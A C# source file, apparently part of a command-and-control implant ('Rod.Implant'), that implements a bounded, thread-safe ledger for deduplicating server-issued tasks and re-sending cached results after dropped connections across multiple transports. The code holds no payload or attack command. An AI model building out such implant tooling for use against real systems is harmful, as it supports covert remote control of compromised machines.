using Rod.V1;

namespace Rod.Implant.Internal;

/// <summary>
/// The per-run ledger of task ids this implant has already parsed
/// (architecture.md Sec 10.3 -- the dispatch strand): the dedup and
/// result-cache half of the receive-ack arm. A stream that dies before a
/// task's ack crossed makes the server redeliver it on the next check-in,
/// so the implant must recognize a task it already holds -- re-ack it
/// without running it twice, and re-send its cached result when the
/// original delivery died with the stream (either may land first
/// server-side; the first result wins there).
///
/// Shared by every check-in client covering one run, the same way the
/// replay-nonce floor is: a task dispatched on one carrier can be
/// redelivered on another when the egress walk crosses shapes, so the
/// ledger spans transports, not connections. Bounded -- an implant runs
/// for a long time and the ledger must not grow with it; past capacity the
/// oldest held id falls out, and a task old enough to evict is old enough
/// that no server still holds it unacked.
/// </summary>
internal sealed class HeldTaskLedger
{
    // How many held task ids the ledger keeps. Generous against any real
    // dispatch-redelivery window, small against a long-running process's
    // memory footprint.
    private const int Capacity = 1024;

    private readonly object _gate = new();
    private readonly LinkedList<string> _order = new();
    private readonly Dictionary<string, Entry> _held = new();

    /// <summary>One held task: whether it completed, and what it reported.</summary>
    private sealed class Entry
    {
        public bool Completed { get; set; }
        public TaskOutcome Outcome { get; set; }
        public string Output { get; set; } = string.Empty;

        /// <summary>
        /// Whether the cached result was written on a connection that lived
        /// to send it. Cleared wholesale when a connection dies -- a write
        /// that completed is not a delivery the server read.
        /// </summary>
        public bool Delivered { get; set; }
    }

    /// <summary>True when the task id was already parsed this run.</summary>
    public bool Contains(string taskId)
    {
        lock (_gate)
        {
            return _held.ContainsKey(taskId);
        }
    }

    /// <summary>
    /// Records a freshly parsed task id, making every later delivery of it a
    /// redelivery. Re-holding an id already held only refreshes its recency.
    /// </summary>
    public void Hold(string taskId)
    {
        lock (_gate)
        {
            if (_held.TryGetValue(taskId, out var existing))
            {
                _order.Remove(taskId);
                _order.AddLast(taskId);
                return;
            }

            while (_order.Count >= Capacity)
            {
                var evicted = _order.First!.Value;
                _order.RemoveFirst();
                _held.Remove(evicted);
            }

            _held[taskId] = new Entry();
            _order.AddLast(taskId);
        }
    }

    /// <summary>Caches a held task's outcome, for re-sending on redelivery.</summary>
    public void Remember(string taskId, TaskOutcome outcome, string output)
    {
        lock (_gate)
        {
            if (!_held.TryGetValue(taskId, out var entry))
                return;

            entry.Completed = true;
            entry.Outcome = outcome;
            entry.Output = output;
        }
    }

    /// <summary>
    /// The cached outcome of a held task, when it completed. Delivered marks
    /// do not hide it here: a redelivery implies the server holds no
    /// recorded result for the task (first-wins dropped or never saw the
    /// original), so the redelivery answer re-sends it regardless.
    /// </summary>
    public bool TryGetResult(string taskId, out TaskOutcome outcome, out string output)
    {
        lock (_gate)
        {
            outcome = TaskOutcome.Unspecified;
            output = string.Empty;
            if (!_held.TryGetValue(taskId, out var entry) || !entry.Completed)
                return false;

            outcome = entry.Outcome;
            output = entry.Output;
            return true;
        }
    }

    /// <summary>
    /// The cached outcome of a held task, when it completed and its delivery
    /// has not been marked. Delivered results stay silent here: this is the
    /// post-connection sweep's read, which re-sends only what may not have
    /// landed rather than spamming every cached result on every reconnect.
    /// </summary>
    public bool TryGetUndelivered(string taskId, out TaskOutcome outcome, out string output)
    {
        lock (_gate)
        {
            outcome = TaskOutcome.Unspecified;
            output = string.Empty;
            if (!_held.TryGetValue(taskId, out var entry) || !entry.Completed || entry.Delivered)
                return false;

            outcome = entry.Outcome;
            output = entry.Output;
            return true;
        }
    }

    /// <summary>
    /// Marks a cached result as written on the live connection. The mark is
    /// an assumption, not a confirmation -- see <see cref="InvalidateDeliveries"/>.
    /// </summary>
    public void MarkDelivered(string taskId)
    {
        lock (_gate)
        {
            if (_held.TryGetValue(taskId, out var entry))
                entry.Delivered = true;
        }
    }

    /// <summary>
    /// Clears every delivery mark: a connection died, and results written on
    /// it may never have been read. The next connection re-sends them; the
    /// server's first-result-wins discipline absorbs the duplicate when the
    /// original did land.
    /// </summary>
    public void InvalidateDeliveries()
    {
        lock (_gate)
        {
            foreach (var entry in _held.Values)
                entry.Delivered = false;
        }
    }

    /// <summary>A cached result whose delivery died with a connection.</summary>
    public readonly record struct Remembered(string TaskId, TaskOutcome Outcome, string Output);

    /// <summary>Every cached result not marked delivered, oldest first.</summary>
    public IReadOnlyList<Remembered> Undelivered()
    {
        lock (_gate)
        {
            var pending = new List<Remembered>();
            foreach (var id in _order)
            {
                var entry = _held[id];
                if (entry.Completed && !entry.Delivered)
                    pending.Add(new Remembered(id, entry.Outcome, entry.Output));
            }

            return pending;
        }
    }
}
